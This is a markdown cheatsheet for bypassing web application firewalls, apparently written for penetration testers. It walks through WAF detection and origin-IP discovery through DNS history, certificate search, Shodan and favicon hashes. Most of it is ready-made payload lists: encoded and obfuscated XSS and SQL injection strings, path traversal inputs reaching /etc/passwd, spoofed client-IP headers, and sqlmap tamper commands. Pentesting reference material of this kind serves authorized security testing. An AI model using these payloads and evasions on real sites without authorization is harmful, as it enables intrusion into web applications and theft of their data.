# 🛡️ WAF Bypass Cheatsheet

```
  ██╗    ██╗ █████╗ ███████╗    ██████╗ ██╗   ██╗██████╗  █████╗ ███████╗███████╗
  ██║    ██║██╔══██╗██╔════╝    ██╔══██╗╚██╗ ██╔╝██╔══██╗██╔══██╗██╔════╝██╔════╝
  ██║ █╗ ██║███████║█████╗      ██████╔╝ ╚████╔╝ ██████╔╝███████║███████╗███████╗
  ██║███╗██║██╔══██║██╔══╝      ██╔══██╗  ╚██╔╝  ██╔═══╝ ██╔══██║╚════██║╚════██║
  ╚███╔███╔╝██║  ██║██║         ██████╔╝   ██║   ██║     ██║  ██║███████║███████║
   ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝         ╚═════╝    ╚═╝   ╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝
   Web Application Firewall Bypass
```

---

## 🎯 What is WAF Bypass

**WAF bypass** techniques allow penetration testers to evade Web Application Firewalls and access the real server or deliver payloads.

### Common WAFs
- Cloudflare
- AWS WAF
- Akamai
- Imperva/Incapsula
- ModSecurity
- F5 BIG-IP
- Fortinet FortiWeb
- Sucuri

---

## 🔍 WAF Detection

### wafw00f
```bash
# Detect WAF
wafw00f https://target.com

# Verbose output
wafw00f https://target.com -v

# Test all WAFs
wafw00f https://target.com -a
```

### Manual Detection
```bash
# Check response headers
curl -I https://target.com

# Look for:
# - Server: cloudflare
# - X-Sucuri-ID
# - X-CDN: Incapsula
# - cf-ray (Cloudflare)
```

---

## 🌐 Origin IP Discovery

### DNS History
```bash
# Services to check:
# - SecurityTrails.com
# - ViewDNS.info/iphistory
# - DNSHistory.org
# - CompleteDNS.com

# SecurityTrails API
curl "https://api.securitytrails.com/v1/history/target.com/dns/a" \
  -H "APIKEY: YOUR_KEY"
```

### SSL Certificate Search
```bash
# Search Censys.io for certificates
# Look for: target.com in certificate

# crt.sh - Certificate Transparency
curl "https://crt.sh/?q=target.com&output=json" | jq

# Censys CLI
censys search "parsed.names: target.com"
```

### Shodan/Censys
```bash
# Shodan
shodan search "ssl:target.com"
shodan search "hostname:target.com"

# Shodan - find by SSL cert hash
shodan search "ssl.cert.fingerprint:XXXX"

# Censys
# Search: services.tls.certificates.leaf_data.subject.common_name: target.com
```

### Email Headers
```bash
# Subscribe to newsletter/notification
# Check email headers for origin IP

# Look for:
# Received: from [ORIGIN_IP]
# X-Originating-IP: [ORIGIN_IP]
```

### Subdomains Without CDN
```bash
# Find subdomains
subfinder -d target.com -o subs.txt

# Check which are behind CDN
cat subs.txt | httpx -ip

# Look for:
# - mail.target.com
# - ftp.target.com
# - dev.target.com
# - staging.target.com
# - api-internal.target.com
# - vpn.target.com
```

### Favicon Hash
```bash
# Get favicon hash
curl -s https://target.com/favicon.ico | md5sum

# Search Shodan by favicon hash
python3 -c "import mmh3,requests,codecs; print(mmh3.hash(codecs.encode(requests.get('https://target.com/favicon.ico').content,'base64')))"

# Shodan search
shodan search "http.favicon.hash:HASH_VALUE"
```

### IPv6 Bypass
```bash
# WAF might not cover IPv6
dig AAAA target.com
curl -g "http://[IPv6_ADDRESS]/" -H "Host: target.com"
```

### Cloud Ranges
```bash
# Download cloud IP ranges
# AWS: https://ip-ranges.amazonaws.com/ip-ranges.json
# Azure: https://www.microsoft.com/en-us/download/details.aspx?id=56519
# GCP: https://www.gstatic.com/ipranges/cloud.json

# If target IP not in cloud ranges = potential origin
```

---

## 🔓 Payload Encoding Bypass

### URL Encoding
```
# Single encode
<script> → %3Cscript%3E

# Double encode
<script> → %253Cscript%253E

# Mixed
<script> → %3Cscr%69pt%3E
```

### Unicode Encoding
```
# UTF-8
<script> → %C0%BC%73%63%72%69%70%74%C0%BE

# Unicode escapes
<script> → \u003cscript\u003e

# HTML entities
<script> → &#60;script&#62;
<script> → &#x3c;script&#x3e;
```

### Case Manipulation
```
<script> → <ScRiPt>
<script> → <SCRIPT>
SELECT → SeLeCt
UNION → UnIoN
```

### Null Bytes
```
# Null byte injection
<scri%00pt>
<script%00>alert(1)</script>
SEL%00ECT
```

### Comments
```sql
# SQL comments
SEL/**/ECT
UNION/**/SELECT
UN/**/ION/**/SE/**/LECT

# Inline comments
SELECT/*comment*/FROM
1'/**/OR/**/1=1--
```

### Whitespace Alternatives
```sql
# Tab, newline, carriage return
SELECT%09FROM
SELECT%0AFROM
SELECT%0DFROM

# Plus sign
UNION+SELECT
1'+OR+1=1--
```

---

## 🔥 WAF-Specific Bypasses

### XSS Bypass
```html
# Standard blocked
<script>alert(1)</script>

# Bypass variations
<svg onload=alert(1)>
<img src=x onerror=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<marquee onstart=alert(1)>
<video src=x onerror=alert(1)>
<audio src=x onerror=alert(1)>
<details open ontoggle=alert(1)>
<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>

# Without parentheses
<img src=x onerror=alert`1`>
<img src=x onerror=alert&lpar;1&rpar;>

# Without alert
<img src=x onerror=confirm(1)>
<img src=x onerror=prompt(1)>
<img src=x onerror=eval('ale'+'rt(1)')>
```

### SQLi Bypass
```sql
# Union bypass
UNION SELECT → UNION ALL SELECT
UNION SELECT → /*!50000UNION*/ SELECT
UNION SELECT → %55nion %53elect
UNION SELECT → uNioN sEleCt

# Comment bypass
-- → #
-- → --+
-- → --%00
-- → /**/

# Logical bypass
OR 1=1 → OR 2=2
OR 1=1 → OR 'a'='a'
OR 1=1 → || 1=1
AND 1=1 → && 1=1

# Version-specific comments (MySQL)
/*!50000SELECT*/ → Runs only if MySQL >= 5.0
```

### Path Traversal Bypass
```
../../../etc/passwd
..%2F..%2F..%2Fetc/passwd
..%252F..%252F..%252Fetc/passwd
....//....//....//etc/passwd
..%c0%af..%c0%af..%c0%afetc/passwd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
```

---

## 🛠️ HTTP Techniques

### HTTP Parameter Pollution
```http
# Duplicate parameters
?id=1&id=2
?id=1&ID=2

# Array injection
?id[]=1&id[]=2
?id=1&id=2&id=3
```

### HTTP Method Tampering
```bash
# Change method
curl -X POST → curl -X PUT
curl -X GET → curl -X TRACE

# Method override headers
X-HTTP-Method-Override: PUT
X-Method-Override: DELETE
X-HTTP-Method: PATCH
```

### Header Manipulation
```http
# IP spoofing headers
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Client-IP: 127.0.0.1
CF-Connecting-IP: 127.0.0.1
True-Client-IP: 127.0.0.1

# Content-Type confusion
Content-Type: application/json
Content-Type: text/plain
Content-Type: application/xml
```

### Chunked Encoding
```http
Transfer-Encoding: chunked

4
test
0
```

---

## 🛠️ Tools

| Tool | Purpose |
|------|---------|
| **wafw00f** | WAF detection |
| **CloudFlair** | Cloudflare origin finder |
| **Bypass-Firewalls-by-DNS-History** | DNS history search |
| **WhatWaf** | WAF detection & bypass |
| **sqlmap --tamper** | SQLi bypass scripts |

### sqlmap Tamper Scripts
```bash
# Use tamper scripts
sqlmap -u "http://target.com/id=1" --tamper=space2comment
sqlmap -u "http://target.com/id=1" --tamper=randomcase
sqlmap -u "http://target.com/id=1" --tamper=between

# Multiple tampers
sqlmap -u "http://target.com/id=1" --tamper=space2comment,randomcase
```

---

## 📊 Quick Reference

| Technique | Use Case |
|-----------|----------|
| DNS History | Find origin IP |
| SSL Search | Censys/Shodan cert search |
| Subdomain enum | Find non-CDN subdomains |
| Encoding | Bypass filters |
| Case variation | Bypass simple rules |
| Comments | Break up keywords |

---

## 📚 Resources

- [PayloadsAllTheThings WAF](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/WAF%20Bypass)
- [HackTricks WAF](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/waf-bypass)
- [OWASP WAF Bypass](https://owasp.org/www-community/attacks/Bypass_Web_Application_Firewall)

---

<p align="center">
  <b>🛡️ Bypass WAFs!</b><br>
  <i>For authorized testing only!</i>
</p>
